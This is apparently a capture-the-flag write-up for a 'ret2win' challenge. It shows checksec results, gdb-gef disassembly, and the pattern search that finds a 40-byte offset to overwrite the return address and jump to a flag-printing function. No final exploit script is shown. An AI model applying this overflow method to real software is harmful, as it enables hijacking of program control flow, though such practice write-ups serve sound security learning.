---------------



# Security on binaries:-
```r
gef➤  checksec
[+] checksec for '/home/robin/Pwn/0x01/ret2win'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial


---------
```


So, everything is NO except NX which means we cannot execute anything from stack, so this means we need to redirect the flow of instruction to the LIBC file(from where all the instructions like printf, gets etc. gets called) or we use any symbols from the binary itself to redirect the instruction flow by overwriting EIP/RIP.


#  Reverse Engineering 

------------------
Binary is not strippped which means debugging symbols are present:-

```r
==============================

file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=aeae454a388c61539b3af41690a7aa437bd8444d, not stripped
```


# Disassembling main function

```r
gef➤  disas main
Dump of assembler code for function main:
   0x000000000040058f <+0>:	push   rbp
   0x0000000000400590 <+1>:	mov    rbp,rsp
   0x0000000000400593 <+4>:	sub    rsp,0x20
   0x0000000000400597 <+8>:	lea    rdi,[rip+0xb8]        # 0x400656
   0x000000000040059e <+15>:	mov    eax,0x0
   0x00000000004005a3 <+20>:	call   0x400470 <printf@plt>
   0x00000000004005a8 <+25>:	lea    rax,[rbp-0x20]
   0x00000000004005ac <+29>:	mov    rdi,rax
   0x00000000004005af <+32>:	mov    eax,0x0
   0x00000000004005b4 <+37>:	call   0x400480 <gets@plt>
   0x00000000004005b9 <+42>:	mov    eax,0x0
   0x00000000004005be <+47>:	leave  
   0x00000000004005bf <+48>:	ret    
End of assembler dump.
==============================
```


It takes input from gets which is vulnerable to more input unless a new line encountered.


#  Finding offset 

Using gdb-gef:-

```r
===========================
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: /home/robin/Pwn/0x01/ret2win 
Tell me your name: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]




─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005b4 <main+37>        call   0x400480 <gets@plt>
     0x4005b9 <main+42>        mov    eax, 0x0
     0x4005be <main+47>        leave  
 →   0x4005bf <main+48>        ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win", stopped, reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005bf → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x00000000004005bf in main ()
gef➤  x/s $rsp
0x7fffffffdd18:	"faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"
gef➤  pattern search faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Searching 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
[+] Found at offset 40 (big-endian search) 
gef➤  x/xg $rsp
0x7fffffffdd18:	0x6161616161616166
gef➤  pattern search 0x6161616161616166
[+] Searching '0x6161616161616166'
[+] Found at offset 40 (little-endian search) likely
[+] Found at offset 33 (big-endian search) 


===================================
```

In x64 it segfaults at ret, since ret is present at the top of the stack, if we can overwrite the that address of stack where ret is we will know the exact characters offset to which we need to overwrite the return pointer, so we need to check rsp offset which will be same for RIP

Now, let's see the functions:-



```r
All defined functions:

Non-debugging symbols:
0x0000000000400438  _init
0x0000000000400460  system@plt
0x0000000000400470  printf@plt
0x0000000000400480  gets@plt
0x0000000000400490  _start
0x00000000004004c0  _dl_relocate_static_pie
0x00000000004004d0  deregister_tm_clones
0x0000000000400500  register_tm_clones
0x0000000000400540  __do_global_dtors_aux
0x0000000000400570  frame_dummy
0x0000000000400577  win
0x000000000040058f  main
0x00000000004005c0  __libc_csu_init
0x0000000000400630  __libc_csu_fini
0x0000000000400634  _fini
```


Let's check win function:-

```r
gef➤  disas win
Dump of assembler code for function win:
   0x0000000000400577 <+0>:	push   rbp
   0x0000000000400578 <+1>:	mov    rbp,rsp
   0x000000000040057b <+4>:	lea    rdi,[rip+0xc2]        # 0x400644
   0x0000000000400582 <+11>:	mov    eax,0x0
   0x0000000000400587 <+16>:	call   0x400460 <system@plt>
   0x000000000040058c <+21>:	nop
   0x000000000040058d <+22>:	pop    rbp
   0x000000000040058e <+23>:	ret    
End of assembler dump.
gef➤  x/s 0x400644
0x400644:	"/bin/cat flag.txt"
gef➤  
```


So, it cats the flag, run the script :)


